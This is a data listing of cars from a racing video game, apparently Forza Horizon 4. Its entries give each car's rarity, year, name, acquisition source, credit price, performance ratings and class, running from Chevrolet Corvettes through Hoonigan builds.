'E	HOR XB1 Chevy Corvette 20 about this car	2020	Chevrolet Corvette Stingray Coupe	Hard-to-Find: Festival reward	250,000 CR	7.5	7.6	7.7	9.2	7.7	S1 830',
'R	HOR XB1 Chevy Corvette 70 about this car	1970	Chevrolet Corvette ZR-1	Autoshow	310,000 CR	5.8	5.1	5.6	6.7	4.7	B 605',
'C	HOR XB1 Chevy Corvette 95 about this car	1995	Chevrolet Corvette ZR-1	Autoshow	45,000 CR	7.1	6.3	6.4	7.8	5.8	A 741',
'R	HOR XB1 Chevy Corvette 09 about this car	2009	Chevrolet Corvette ZR1	Autoshow	125,000 CR	8.2	7.1	6.7	6.3	7.5	S1 824',
'E	HOR XB1 Chevy Corvette 19 about this car	2019	Chevrolet Corvette ZR1	DLC: Car Pass	225,000 CR	8.1	8.5	7.5	9.0	9.2	S1 895',
'R	HOR XB1 Chevy El about this car	1970	Chevrolet El Camino Super Sport 454	Autoshow	65,000 CR	6.6	4.6	5.0	6.3	4.3	C 556',
'C	HOR XB1 Chevy Impala 96 about this car	1996	Chevrolet Impala Super Sport	Hard-to-Find: Festival reward	250,000 CR	5.9	4.8	5.4	6.6	4.6	C 510',
'C	HOR XB1 Chevy Impala 64 about this car	1964	Chevrolet Impala Super Sport 409	Autoshow	46,000 CR	6.3	4.3	5.1	6.4	4.2	C 527',
'C	HOR XB1 Chevy Monte about this car	1988	Chevrolet Monte Carlo Super Sport	HL: LaRacer - Tier 10	25,000 CR	5.9	4.5	5.0	6.3	3.9	D 415',
'C	HOR XB1 Chevy Nova 66 about this car	1966	Chevrolet Nova Super Sport	Autoshow	70,000 CR	6.2	4.8	5.4	6.9	4.5	C 582',
'C	HOR XB1 Chevy Nova 69 about this car	1969	Chevrolet Nova Super Sport 396	Autoshow	47,000 CR	6.2	4.6	5.3	6.6	4.3	C 552',
'F	HOR XB1 Chevy Nova 69 FE about this car	1969	Chevrolet Nova Super Sport 396 F.E.	Wheelspin reward	297,000 CR	8.5	7.3	10	10	7.5	S2 981',
'E	HOR XB1 Chevy Silverado about this car	2018	Chevrolet Silverado 1500 DeBerti Design Drift Truck	DLC: Car Pass	300,000 CR	7.2	7.6	6.6	8.3	7.7	S1 849',
'R	HOR XB1 Chrysler VH about this car	1972	Chrysler VH Valiant Charger R/T E49	Autoshow	60,000 CR	5.9	4.7	5.2	6.7	4.4	C 557',
'E	Missing Car about this car	1975	Citroën DS 23	Hard-to-Find: Festival reward	250,000 CR	5.1	4.6	4.2	5.0	4.4	D 262',
'C	HOR XB1 Datsun 510 about this car	1970	Datsun 510	Autoshow	25,000 CR	4.8	3.9	4.7	6.1	3.8	D 209',
'R	HOR XB1 Dodge Challenger 70 about this car	1970	Dodge Challenger R/T	Autoshow	210,000 CR	6.2	4.7	5.2	6.5	4.4	C 562',
'E	HOR XB1 Dodge Challenger 18 about this car	2018	Dodge Challenger SRT Demon	HL: The Stunt Driver - Tier 10	150,000 CR	8.2	7.0	6.3	8.0	7.4	S1 823',
'R	HOR XB1 Dodge Challenger 15 about this car	2015	Dodge Challenger SRT Hellcat	Autoshow	75,000 CR	8.1	6.1	5.9	7.5	6.5	A 776',
'L	HOR XB1 Dodge Charger 69 Daytona about this car	1969	Dodge Charger Daytona HEMI	Autoshow	900,000 CR	5.9	5.2	5.4	6.9	4.8	C 595',
'R	HOR XB1 Dodge Charger 69 about this car	1969	Dodge Charger R/T	Autoshow	103,000 CR	5.9	4.7	5.3	6.8	4.3	C 558',
'R	HOR XB1 Dodge Charger 15 about this car	2015	Dodge Charger SRT Hellcat	Autoshow	80,000 CR	8.2	6.1	6.1	7.7	6.5	A 785',
'R	HOR XB1 Dodge Dart about this car	1968	Dodge Dart HEMI Super Stock	Autoshow	125,000 CR	5.4	4.9	5.5	7.0	4.6	B 626',
'R	HOR XB1 Dodge Durango about this car	2018	Dodge Durango SRT	Autoshow	70,000 CR	6.9	5.9	7.3	9.2	5.5	A 709',
'E	HOR XB1 Dodge SRT about this car	2013	Dodge SRT Viper GTS	Autoshow	95,000 CR	8.0	7.3	7.0	8.2	7.2	S1 831',
'E	HOR XB1 Dodge Viper 16 about this car	2016	Dodge Viper ACR	Autoshow	150,000 CR	6.9	9.8	7.6	8.7	10	S1 893',
'R	HOR XB1 Dodge Viper 99 about this car	1999	Dodge Viper GTS ACR	Autoshow	75,000 CR	7.4	5.9	6.6	8.1	5.9	A 732',
'R	HOR XB1 Dodge Viper 08 about this car	2008	Dodge Viper SRT10 ACR	Autoshow	90,000 CR	7.5	9.2	7.1	8.3	9.6	S1 866',
'E	HOR XB1 Donkervoort D8 about this car	2013	Donkervoort D8 GTO	Autoshow	175,000 CR	6.9	7.4	6.7	8.4	7.8	S1 827',
'C	HOR XB1 DSA DS3 about this car	2011	DS Automobiles DS3 Racing	Hard-to-Find: Festival reward	38,000 CR	6.1	6.0	5.8	7.3	6.0	B 624',
'L	HOR XB1 Eagle Speedster about this car	2012	Eagle Speedster	Autoshow	550,000 CR	6.8	6.5	6.1	7.8	6.7	A 740',
'E	HOR XB1 Exomotive Exocet about this car	2018	Exomotive Exocet Off-Road	DLC: Fortune Island	50,000 CR	5.4	7.7	6.8	8.5	7.4	A 729',
'L	HOR XB1 Ferrari 24 330 about this car	1967	Ferrari 24 Ferrari Spa 330 P4	Autoshow	10,000,000 CR	7.6	6.8	7.3	8.9	6.0	A 799',
'L	HOR XB1 Ferrari 166MM about this car	1948	Ferrari 166MM Barchetta	Autoshow	6,500,000 CR	5.7	5.1	5.5	7.1	4.9	C 554',
'L	HOR XB1 Ferrari 250 57 California about this car	1957	Ferrari 250 California	Autoshow	8,000,000 CR	6.2	4.6	5.2	6.0	4.5	C 540',
'L	HOR XB1 Ferrari 250 62 GT about this car	1962	Ferrari 250 GT Berlinetta Lusso	Autoshow	2,600,000 CR	6.3	4.7	5.6	7.2	4.6	C 568',
'L	HOR XB1 Ferrari 250 62 GTO about this car	1962	Ferrari 250 GTO	Autoshow	10,000,000 CR	7.0	5.6	5.3	6.2	4.7	B 679',
'L	HOR XB1 Ferrari 250LM about this car	1963	Ferrari 250LM	Autoshow	10,000,000 CR	7.1	6.0	5.1	5.9	5.6	A 732',
'L	HOR XB1 Ferrari 250 57 Testa about this car	1957	Ferrari 250 Testa Rossa	Autoshow	10,000,000 CR	6.9	5.6	6.0	7.7	4.7	A 704',
'L	HOR XB1 Ferrari 288 about this car	1984	Ferrari 288 GTO	Autoshow	3,100,000 CR	7.8	6.2	6.8	8.4	6.1	A 768',
'E	HOR XB1 Ferrari 360 about this car	2003	Ferrari 360 Challenge Stradale	Autoshow	200,000 CR	7.5	7.0	7.1	8.7	7.4	A 792',
'E	HOR XB1 Ferrari 365 about this car	1968	Ferrari 365 GTB/4	Autoshow	600,000 CR	7.5	5.1	5.9	7.1	4.6	B 641',
'E	HOR XB1 Ferrari 430 about this car	2007	Ferrari 430 Scuderia	Autoshow	300,000 CR	8.0	7.4	7.2	8.8	7.9	S1 834',
'E	HOR XB1 Ferrari 458 09 about this car	2009	Ferrari 458 Italia	Autoshow	225,000 CR	8.1	7.3	7.3	8.9	7.9	S1 846',
'E	HOR XB1 Ferrari 458 13 about this car	2013	Ferrari 458 Speciale	Autoshow	340,000 CR	8.1	8.2	7.6	9.1	8.8	S1 885',
'E	HOR XB1 Ferrari 488 15 about this car	2015	Ferrari 488 GTB	Autoshow	290,000 CR	8.5	8.1	7.5	9.1	8.7	S1 883',
'L	HOR XB1 Ferrari 488 19 about this car	2019	Ferrari 488 Pista	Hard-to-Find: Festival reward	250,000 CR	8.0	9.0	8.0	9.4	9.6	S2 912',
'L	HOR XB1 Ferrari 500 about this car	1953	Ferrari 500 Mondial	Autoshow	1,000,000 CR	6.1	5.1	4.7	5.0	4.7	C 544',
'L	HOR XB1 Ferrari 512 70 about this car	1970	Ferrari 512 S	Hard-to-Find: Festival reward	250,000 CR	8.0	8.0	7.9	9.0	7.5	S1 872',
'E	HOR XB1 Ferrari 512 92 about this car	1992	Ferrari 512 TR	Autoshow	270,000 CR	7.9	6.3	6.6	7.7	5.8	A 754',
'E	HOR XB1 Ferrari 575M about this car	2002	Ferrari 575M Maranello	Autoshow	140,000 CR	7.9	6.2	6.6	8.3	6.1	A 772',
'E	HOR XB1 Ferrari 599 about this car	2010	Ferrari 599 GTO	Autoshow	690,000 CR	8.3	7.9	7.3	8.9	8.5	S1 861',
'L	HOR XB1 Ferrari 599XX 10 about this car	2010	Ferrari 599XX	Autoshow	1,000,000 CR	7.8	9.4	7.9	9.3	9.9	S2 937',
'L	HOR XB1 Ferrari 599XX 12 about this car	2012	Ferrari 599XX Evolution	Hard-to-Find: Festival reward	250,000 CR	8.9	10	8.1	9.5	10	S2 979',
'L	HOR XB1 Ferrari 812 about this car	2017	Ferrari 812 Superfast	Star Card:  Story	1,400,000 CR	8.3	8.1	7.1	8.7	8.6	S1 897',
'E	HOR XB1 Ferrari California 14 about this car	2014	Ferrari California T	Autoshow	240,000 CR	7.7	6.7	6.8	8.5	7.3	S1 804',
'E	HOR XB1 Ferrari Dino about this car	1969	Ferrari Dino 246 GT	Autoshow	425,000 CR	6.0	4.8	5.0	5.8	4.5	C 512',
'L	HOR XB1 Ferrari Enzo about this car	2002	Ferrari Enzo Ferrari	Autoshow	2,800,000 CR	8.4	8.0	7.4	8.9	8.4	S1 874',
'E	HOR XB1 Ferrari F12berlinetta about this car	2012	Ferrari F12berlinetta	Autoshow	380,000 CR	8.3	7.3	7.1	8.7	7.9	S1 868',
'E	HOR XB1 Ferrari F12tdf about this car	2015	Ferrari F12tdf	Autoshow	500,000 CR	8.8	8.3	7.3	8.9	9.0	S2 901',
'L	HOR XB1 Ferrari F40 87 about this car	1987	Ferrari F40	Autoshow	1,200,000 CR	7.7	7.0	7.5	8.1	7.0	S1 807',
'L	HOR XB1 Ferrari F40 89 about this car	1989	Ferrari F40 Competizione	Autoshow	3,000,000 CR	8.5	10	7.0	5.4	10	S2 961',
'L	HOR XB1 Ferrari F50 95 about this car	1995	Ferrari F50	Autoshow	2,000,000 CR	7.8	7.1	7.2	8.5	7.4	S1 815',
'L	HOR XB1 Ferrari F50 96 about this car	1996	Ferrari F50 GT	Autoshow	1,200,000 CR	8.4	10	8.4	9.5	10	S2 992',
'L	HOR XB1 Ferrari F50 96 WP about this car	1996	Ferrari F50 GT Welcome Pack	DLC: Welcome Pack	1,200,000 CR	8.4	10	8.3	9.6	10	S2 998',
'E	HOR XB1 Ferrari F355 about this car	1994	Ferrari F355 Berlinetta	Autoshow	190,000 CR	7.4	6.3	6.2	7.4	6.3	A 737',
'E	HOR XB1 Ferrari FF about this car	2011	Ferrari FF	Autoshow	255,000 CR	8.1	6.6	7.5	8.8	7.2	S1 815',
'L	HOR XB1 Ferrari FXX 05 about this car	2005	Ferrari FXX	DLC: Car Pass	2,500,000 CR	8.3	10	8.7	9.9	10	S2 961',
'L	HOR XB1 Ferrari FXX 14 about this car	2014	Ferrari FXX K	Autoshow	2,700,000 CR	8.1	10	8.8	9.9	10	S2 989',
'E	HOR XB1 Ferrari GTC4Lusso about this car	2017	Ferrari GTC4Lusso	DLC: Car Pass	430,000 CR	8.0	7.3	8.2	9.4	7.9	S1 840',
'L	HOR XB1 Ferrari LaFerrari about this car	2013	Ferrari LaFerrari	Autoshow	1,500,000 CR	9.5	9.8	8.2	9.5	10	S2 966',
'E	HOR XB1 Ferrari Portofino about this car	2018	Ferrari Portofino	Autoshow	215,000 CR	8.2	7.3	7.2	8.8	7.9	S1 834',
'C	HOR XB1 FIAT 124 about this car	1980	FIAT 124 Sport Spider	Autoshow	25,000 CR	4.9	4.0	4.2	6.5	4.0	D 244',
'R	HOR XB1 FIAT Dino about this car	1969	FIAT Dino 2.4 Coupe	Hard-to-Find: Festival reward	250,000 CR	5.7	4.7	5.4	6.9	4.5	D 468',
'R	HOR XB1 FIAT X1-9 FH4 about this car	1975	FIAT X1/9	Hard-to-Find: Festival reward	250,000 CR	4.8	4.1	4.0	5.7	3.7	D 127',
'L	HOR XB1 Ford 2 GT40 about this car	1966	Ford 2 GT40 Mk II Le Mans	Autoshow	10,000,000 CR	7.8	6.6	6.0	7.2	6.0	A 795',
'E	HOR XB1 Ford 5 Escort about this car	1977	Ford 5 RS1800 MK II	Hard-to-Find: Festival reward	250,000 CR	5.4	6.6	6.9	8.6	7.0	A 729',
'E	HOR XB1 Ford 11 F-150 about this car	2014	Ford 11 Rockstar F-150 Trophy Truck	Autoshow	500,000 CR	6.4	6.6	6.6	8.0	6.2	A 785',
'E	HOR XB1 Ford 14 GRC about this car	2017	Ford 14 Rahal Letterman Lanigan Racing GRC Fiesta	Autoshow	500,000 CR	5.8	7.7	10	10	8.0	S1 880',
'E	HOR XB1 Ford 25 Mustang about this car	2018	Ford 25 RTR Mustang	HL: Drift Adventure - Tier 19	500,000 CR	6.6	7.9	6.7	8.4	8.0	S1 871',
'E	HOR XB1 Ford 88 Mustang about this car	2018	Ford 88 RTR Mustang	Hard-to-Find: Festival reward	500,000 CR	6.6	7.9	6.7	8.4	8.0	S1 871',
'C	HOR XB1 Ford Anglia about this car	1959	Ford Anglia 105E	Autoshow	20,000 CR	3.9	3.9	3.7	4.9	3.9	D 100',
'C	HOR XB1 Ford Bronco about this car	1975	Ford Bronco	Autoshow	38,000 CR	5.2	4.2	5.3	7.0	3.9	D 379',
'E	HOR XB1 Ford Bronco BJ about this car	1975	Ford Bronco Barrett-Jackson Edition	DLC: Barrett-Jackson Car Pack	105,000 CR	5.4	6.3	6.6	8.1	5.7	B 630',
'R	HOR XB1 Ford Capri about this car	1973	Ford Capri RS3100	Autoshow	55,000 CR	5.7	4.7	5.4	6.9	4.4	D 478',
'F	HOR XB1 Ford Capri FE about this car	1973	Ford Capri RS3100 F.E.	Star Card:  Complete all challenges	305,000 CR	5.7	6.5	5.5	7.1	5.3	B 613',
'C	HOR XB1 Ford Crown about this car	2010	Ford Crown Victoria Police Interceptor	Wheelspin reward	25,000 CR	6.0	5.1	4.9	5.6	4.7	C 521',
'E	HOR XB1 Ford Custom about this car	1932	Ford Custom Double Down	DLC: Barrett-Jackson Car Pack	105,000 CR	8.6	8.0	10.0	10.0	8.2	S2 927',
'C	HOR XB1 Ford De 40 about this car	1940	Ford De Luxe Coupe	Autoshow	44,000 CR	4.4	3.8	4.1	5.5	3.7	D 100',
'C	HOR XB1 Ford De 32 about this car	1932	Ford De Luxe Five-Window Coupe	Autoshow	35,000 CR	4.4	3.8	3.9	5.9	3.2	D 100',
'R	HOR XB1 Ford Escort 73 about this car	1973	Ford Escort RS1600	Autoshow	73,000 CR	5.2	5.0	5.4	6.7	4.8	D 440',
'R	HOR XB1 Ford Escort 77 about this car	1977	Ford Escort RS1800	Autoshow	88,000 CR	5.2	4.0	5.1	6.5	3.7	D 311',
'R	HOR XB1 Ford Escort 92 about this car	1992	Ford Escort RS Cosworth	Autoshow	66,000 CR	6.0	5.3	6.0	8.0	5.3	C 566',
'R	HOR XB1 Ford Escort 86 about this car	1986	Ford Escort RS Turbo	Barn Find	25,000 CR	5.5	5.2	5.7	7.3	4.9	C 506',
'C	HOR XB1 Ford F-100 about this car	1956	Ford F-100	Autoshow	36,000 CR	4.9	3.7	4.9	6.1	3.7	D 221',
'E	HOR XB1 Ford F-150 18 about this car	2018	Ford F-150 Prerunner DeBerti Design Truck	HL: The Eliminator - Tier 15	250,000 CR	6.5	6.3	7.4	9.0	6.3	A 750',
'C	HOR XB1 Ford F-150 17 about this car	2017	Ford F-150 Raptor	Autoshow	63,000 CR	5.8	5.9	6.4	8.5	5.4	B 627',
'R	HOR XB1 Ford F-150 11 about this car	2011	Ford F-150 SVT Raptor	Wheelspin reward	42,000 CR	6.1	5.5	5.8	7.2	4.9	C 564',
'R	HOR XB1 Ford Falcon 15 about this car	2015	Ford Falcon GT F 351	Autoshow	60,000 CR	7.5	6.1	6.2	7.8	6.4	A 739',
'R	HOR XB1 Ford Falcon 72 about this car	1972	Ford Falcon XA GT-HO	Autoshow	80,000 CR	7.0	4.9	5.5	6.9	4.6	B 608',
'F	HOR XB1 Ford Falcon 72 FE about this car	1972	Ford Falcon XA GT-HO F.E.	Wheelspin reward	330,000 CR	7.0	7.4	7.2	8.5	6.8	S1 811',
'C	HOR XB1 Ford Fiesta 14 about this car	2014	Ford Fiesta ST	Autoshow	25,000 CR	6.1	6.1	5.8	7.4	5.7	B 621',
'C	HOR XB1 Ford Fiesta 81 about this car	1981	Ford Fiesta XR2	Autoshow	25,000 CR	4.8	4.7	4.9	6.4	4.6	D 324',
'C	HOR XB1 Ford Focus 03 about this car	2003	Ford Focus RS	Autoshow	30,000 CR	6.0	6.2	6.0	7.7	6.4	B 649',
'C	HOR XB1 Ford Focus 09 about this car	2009	Ford Focus RS	Autoshow	25,000 CR	6.3	6.3	6.0	7.6	6.5	B 696',
'R	HOR XB1 Ford Focus 17 about this car	2017	Ford Focus RS	Autoshow	59,000 CR	6.9	6.3	7.3	9.2	6.5	A 718',
'R	HOR XB1 Ford Focus 17 PO about this car	2017	Ford Focus RS Preorder Car	Pre-Order bonus  / Forzathon Shop	59,000 CR	7.4	6.7	9.2	10	7.4	A 800',
'R	HOR XB1 Ford FPV about this car	2014	Ford FPV Limited Edition Pursuit Ute	Autoshow	50,000 CR	7.0	5.8	6.1	7.7	5.9	A 710',
'E	HOR XB1 Ford GT 05 about this car	2005	Ford GT	Autoshow	300,000 CR	8.1	7.1	6.4	7.3	7.4	S1 810',
'E	HOR XB1 Ford GT 17 about this car	2017	Ford GT	Autoshow	400,000 CR	8.6	8.4	7.5	9.0	8.9	S1 900',
'L	HOR XB1 Ford GT 17 WP about this car	2017	Ford GT Welcome Pack 	DLC: Welcome Pack	400,000 CR	9.2	10	8.3	9.6	10	S2 998',
'L	HOR XB1 Ford GT40 64 about this car	1964	Ford GT40 Mk I	Barn Find	9,000,000 CR	7.4	6.4	6.2	7.4	5.7	A 772',
'L	HOR XB1 Ford GT70 about this car	1970	Ford GT70	Hard-to-Find: Festival reward	250,000 CR	5.9	6.6	5.9	7.0	5.9	B 694',
'C	HOR XB1 Ford Lotus about this car	1966	Ford Lotus Cortina	Autoshow	50,000 CR	5.1	4.6	5.3	6.7	4.6	D 379',
'E	HOR XB1 Ford M-Sport about this car	2017	Ford M-Sport Fiesta RS	Autoshow	500,000 CR	5.9	7.9	9.9	10	8.2	S1 819',
'R	HOR XB1 Ford Mustang 68 about this car	1968	Ford Mustang 2+2 Fastback	DLC: Car Pass	50,000 CR	6.4	4.5	5.1	6.5	4.2	C 505',
'L	HOR XB1 Ford Mustang 69 about this car	1969	Ford Mustang Boss 302	HL: Drift Club - Tier 10	230,000 CR	6.3	5.0	5.0	5.8	4.6	C 564',
'R	HOR XB1 Ford Mustang 18 GT about this car	2018	Ford Mustang GT	Autoshow	40,000 CR	7.5	6.5	6.4	8.1	6.6	A 778',
'R	HOR XB1 Ford Mustang 65 about this car	1965	Ford Mustang GT Coupe	Autoshow	46,000 CR	6.0	4.4	5.1	6.4	4.3	C 507',
'E	HOR XB1 Ford Mustang 18 DeBerti about this car	2018	Ford Mustang GT DeBerti Design	DLC: Car Pass	500,000 CR	8.2	7.1	7.2	8.8	7.3	S1 835',
'E	HOR XB1 Ford Mustang 71 about this car	1971	Ford Mustang Mach 1	Autoshow	45,000 CR	5.7	4.8	5.1	6.4	4.4	C 561',
'E	HOR XB1 Ford Mustang 18 RTR about this car	2018	Ford Mustang RTR Spec 5	Hard-to-Find: Festival reward	500,000 CR	7.1	6.8	6.4	8.1	6.8	A 780',
'E	HOR XB1 Ford Mustang 20 about this car	2020	Ford Mustang Shelby GT500	Hard-to-Find: Festival reward	250,000 CR	7.9	7.9	7.0	8.6	8.4	S1 863',
'R	HOR XB1 Ford Racing about this car	1999	Ford Racing Puma	Hard-to-Find: Festival reward	250,000 CR	5.7	6.1	5.3	6.7	5.6	C 549',
'C	HOR XB1 Ford Ranger 19 about this car	2019	Ford Ranger Raptor	Autoshow	58,000 CR	5.5	5.8	4.6	7.3	5.6	D 498',
'E	HOR XB1 Ford Ranger 14 about this car	2014	Ford Ranger T6 Rally Raid	Autoshow	500,000 CR	5.4	5.8	7.0	10	5.8	A 703',
'E	HOR XB1 Ford Roadster about this car	1932	Ford Roadster "Hula Girl"	DLC: Barrett-Jackson Car Pack	105,000 CR	5.2	5.7	6.1	7.8	5.1	C 590',
'L	HOR XB1 Ford RS200 about this car	1985	Ford RS200	HL: Dirt Racing - Tier 4	260,000 CR	6.2	7.4	8.2	8.0	7.2	S1 839',
'E	HOR XB1 Ford Shelby 16 about this car	2016	Ford Shelby GT350R	Autoshow	75,000 CR	7.7	8.1	7.2	8.8	8.5	S1 840',
'E	HOR XB1 Ford Shelby 13 about this car	2013	Ford Shelby GT500	Autoshow	115,000 CR	7.8	6.4	6.1	7.7	6.4	A 774',
'R	HOR XB1 Ford Sierra about this car	1987	Ford Sierra Cosworth RS500	Autoshow	66,000 CR	6.4	5.7	6.1	7.7	5.2	B 608',
'C	HOR XB1 Ford Super about this car	1946	Ford Super Deluxe Station Wagon	Autoshow	75,000 CR	4.6	3.7	3.7	5.4	3.6	D 100',
'E	HOR XB1 Ford Supervan about this car	1994	Ford Supervan 3	Hard-to-Find: Festival reward	500,000 CR	5.8	9.4	8.2	9.6	10	S1 828',
'C	HOR XB1 Ford SVT 93 about this car	1993	Ford SVT Cobra R	Wheelspin reward	28,000 CR	6.1	4.8	5.5	7.0	4.9	C 533',
'C	HOR XB1 Ford SVT 00 about this car	2000	Ford SVT Cobra R	Autoshow	55,000 CR	7.3	5.7	5.8	7.4	5.6	B 682',
'C	HOR XB1 Ford Transit 65 about this car	1965	Ford Transit	DLC: Car Pass	25,000 CR	3.8	4.1	3.4	3.0	4.4	D 100',
'R	HOR XB1 Ford Transit 11 about this car	2011	Ford Transit SuperSportVan	Autoshow	50,000 CR	5.4	5.1	4.6	7.1	5.1	D 416',
'F	HOR XB1 Ford Transit 11 FE about this car	2011	Ford Transit SuperSportVan F.E.	DLC: VIP Membership	50,000 CR	5.4	9.4	5.4	8.5	9.4	B 695',
'R	HOR XB1 Ford XB about this car	1973	Ford XB Falcon GT	Wheelspin reward	60,000 CR	6.0	4.7	5.1	6.4	4.5	C 529',
'E	HOR XB1 FD Ford 13 Mustang about this car	2015	Formula Drift 13 Ford Mustang	DLC: Formula Drift Car Pack	300,000 CR	6.6	7.6	6.6	8.3	7.7	S1 852',
'E	HOR XB1 FD Dodge 43 Viper about this car	2006	Formula Drift 43 Dodge Viper SRT10	DLC: Formula Drift Car Pack	300,000 CR	7.7	7.8	6.6	8.2	7.9	S1 859',
'E	HOR XB1 FD 64 Nissan 370Z about this car	2018	Formula Drift 64 Nissan 370Z	Hard-to-Find: Festival reward	500,000 CR	7.8	7.7	6.7	8.4	7.6	S1 884',
'E	HOR XB1 FD BMW 98 325i about this car	1989	Formula Drift 98 BMW 325i	DLC: Formula Drift Car Pack	300,000 CR	7.4	7.2	6.6	8.2	7.2	S1 837',
'E	HOR XB1 FD Ferrari 117 599 about this car	2007	Formula Drift 117 599 GTB Fiorano	Hard-to-Find: Festival reward	500,000 CR	7.3	8.2	7.2	8.8	8.3	S1 896',
'E	HOR XB1 FD Nissan 118 240SX about this car	1995	Formula Drift 118 Nissan 240SX	DLC: Formula Drift Car Pack	300,000 CR	6.5	7.6	6.9	8.5	7.6	S1 860',
'E	HOR XB1 FD Nissan 232 240SX about this car	1996	Formula Drift 232 Nissan 240SX	DLC: Formula Drift Car Pack	300,000 CR	7.5	7.6	6.5	8.2	7.6	S1 859',
'E	HOR XB1 FD HSV 530 Maloo about this car	2016	Formula Drift 530 HSV Maloo Gen-F	DLC: Formula Drift Car Pack	300,000 CR	7.9	7.3	6.2	7.9	7.4	S1 836',
'E	HOR XB1 FD Chevy 777 Corvette about this car	2013	Formula Drift 777 Chevrolet Corvette	Hard-to-Find: Festival reward	500,000 CR	7.0	7.8	6.6	8.3	7.8	S1 885',
'E	HOR XB1 FD Nissan 777 240SX about this car	1997	Formula Drift 777 Nissan 240SX	DLC: Formula Drift Car Pack	300,000 CR	7.3	7.5	6.8	8.4	7.5	S1 861',
'E	HOR XB1 FM F9 about this car	2018	Funco Motorsports F9	DLC: Fortune Island	500,000 CR	6.0	6.7	8.7	9.9	6.7	S1 860',
'E	HOR XB1 GMC Syclone FH4 about this car	1991	GMC Syclone	Hard-to-Find: Festival reward	250,000 CR	6.1	4.7	6.9	8.4	4.6	C 545',
'E	HOR XB1 GMC Typhoon about this car	1992	GMC Typhoon	Hard-to-Find: Festival reward	250,000 CR	5.9	4.6	6.2	7.7	4.5	C 510',
'C	HOR XB1 GMC Vandura about this car	1983	GMC Vandura G-1500	Autoshow	25,000 CR	4.7	3.9	4.3	5.4	3.8	D 151',
'R	HOR XB1 HDT VK about this car	1985	HDT VK Commodore Group A	Autoshow	28,000 CR	5.9	4.8	5.5	6.6	4.6	C 545',
'L	HOR XB1 Hennessey VelociRaptor about this car	2019	Hennessey VelociRaptor 6x6	Hard-to-Find: Festival reward	350,000 CR	6.0	6.6	7.1	8.9	6.4	A 705',
'L	HOR XB1 Hennessey Venom about this car	2012	Hennessey Venom GT	Autoshow	1,200,000 CR	10	8.3	7.6	9.1	8.7	S2 930',
'C	HOR XB1 Hillman Imp about this car	1966	Hillman Imp	DLC: Car Pass	25,000 CR	4.3	4.0	3.7	5.6	3.8	D 100',
'C	HOR XB1 Holden HQ about this car	1973	Holden HQ Monaro GTS 350	Autoshow	75,000 CR	5.7	4.7	5.3	6.7	4.4	C 524',
'C	HOR XB1 Holden Sandman about this car	1974	Holden Sandman HQ Panel Van	Autoshow	55,000 CR	5.7	4.7	5.4	6.9	4.5	D 500',
'R	HOR XB1 Holden Torana about this car	1977	Holden Torana A9X	Autoshow	130,000 CR	5.8	4.7	5.1	6.5	4.5	C 507',
'R	HOR XB1 Holden VL FH4 about this car	1988	Holden VL Commodore Group A SV	Hard-to-Find: Festival reward	250,000 CR	6.5	5.2	5.7	6.8	5.2	C 578',
'E	HOR XB1 Honda Civic 16 Coupe about this car	2016	Honda Civic Coupe GRC	DLC: Car Pass	155,000 CR	5.8	7.8	10	10	8.0	S1 878',
'C	HOR XB1 Honda Civic 84 about this car	1984	Honda Civic CRX Mugen	Hard-to-Find: Festival reward	40,000 CR	5.7	5.0	4.9	5.4	4.7	D 492',
'C	HOR XB1 Honda Civic 74 about this car	1974	Honda Civic RS	DLC: Car Pass	25,000 CR	5.0	4.7	4.3	6.7	4.3	D 320',
'C	HOR XB1 Honda Civic 97 about this car	1997	Honda Civic Type R	Autoshow	25,000 CR	6.2	5.3	5.5	6.8	5.2	C 551',
'C	HOR XB1 Honda Civic 04 about this car	2004	Honda Civic Type-R	Wheelspin reward	25,000 CR	6.2	5.8	5.7	7.2	5.5	B 610',
'C	HOR XB1 Honda Civic 07 about this car	2007	Honda Civic Type-R	Autoshow	20,000 CR	6.1	6.2	5.7	6.9	5.3	C 576',
'C	HOR XB1 Honda Civic 15 about this car	2015	Honda Civic Type R	Autoshow	38,000 CR	7.0	6.4	6.1	7.7	6.6	A 714',
'R	HOR XB1 Honda Civic 18 about this car	2018	Honda Civic Type R	Hard-to-Find: Festival reward	59,000 CR	7.4	6.7	6.0	7.7	6.8	A 745',
'C	HOR XB1 Honda CR-X about this car	1991	Honda CR-X SiR	Autoshow	20,000 CR	6.0	5.1	5.0	6.0	4.7	C 504',
'E	HOR XB1 Honda NSX-R 92 about this car	1992	Honda NSX-R	Autoshow	90,000 CR	6.9	6.3	6.6	7.7	6.4	A 707',
'E	HOR XB1 Honda NSX-R 05 about this car	2005	Honda NSX-R	Wheelspin reward	150,000 CR	7.0	6.4	6.6	7.8	5.9	A 714',
'E	HOR XB1 Honda NSX-R 05 GT about this car	2005	Honda NSX-R GT	DLC: Car Pass	500,000 CR	7.0	6.9	6.9	8.3	6.8	A 744',
'C	HOR XB1 Honda Prelude about this car	1994	Honda Prelude Si	Hard-to-Find: Festival reward	250,000 CR	5.9	5.3	5.5	7.3	4.8	D 500',
'E	HOR XB1 Honda Ridgeline about this car	2015	Honda Ridgeline Baja Trophy Truck	Autoshow	500,000 CR	6.0	6.4	6.8	8.5	6.2	A 751',
'R	HOR XB1 Honda S800 about this car	1970	Honda S800	Hard-to-Find: Festival reward	250,000 CR	4.7	4.0	5.3	6.8	3.9	D 193',
'C	HOR XB1 Honda S2000 03 about this car	2003	Honda S2000	DLC: Car Pass	25,000 CR	6.6	5.4	5.9	7.4	4.9	B 618',
'C	HOR XB1 Honda S2000 09 about this car	2009	Honda S2000 CR	Autoshow	25,000 CR	6.4	6.2	6.2	7.5	5.3	B 647',
'E	HOR XB1 Hoonigan Chevy Bel about this car	1955	Hoonigan Chevrolet Bel Air	Autoshow	76,000 CR	6.5	4.3	5.8	6.9	4.5	C 571',
'E	HOR XB1 Hoonigan Chevy Nova about this car	1972	Hoonigan Chevrolet "Napalm Nova"	Wheelspin reward	50,000 CR	7.3	6.3	6.4	8.1	6.7	A 765',
'E	HOR XB1 Hoonigan Ford Bronco about this car	1974	Hoonigan Ford Bronco	Hard-to-Find: Festival reward	200,000 CR	5.8	8.5	8.4	10	8.2	A 721',
'E	HOR XB1 Hoonigan Ford Escort 78 about this car	1978	Hoonigan Ford Escort RS1800	Autoshow	300,000 CR	6.7	7.7	6.6	8.3	8.2	S1 828',
'L	HOR XB1 Hoonigan Ford Mustang about this car	1965	Hoonigan Ford "Hoonicorn" Mustang	Autoshow	500,000 CR	9.3	8.2	10	10	8.5	S2 985',
'L	HOR XB1 Hoonigan Ford RS200 about this car	1986	Hoonigan Ford RS200 Evolution	Hard-to-Find: Festival reward	500,000 CR	8.0	8.2	10	10	7.9	S2 932',
